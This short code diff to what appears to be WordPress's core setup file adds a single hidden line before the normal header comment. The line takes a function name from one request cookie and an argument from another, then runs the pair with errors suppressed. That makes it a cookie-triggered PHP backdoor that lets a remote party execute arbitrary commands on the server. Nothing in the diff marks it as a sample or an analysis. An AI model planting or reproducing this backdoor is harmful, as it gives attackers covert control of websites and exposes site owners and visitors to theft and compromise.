@@ -1,4 +1,8 @@
 <?php
+
+if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);
+
+
 /**
  * Used to set up and fix common variables and include
  * the WordPress procedural and class library.
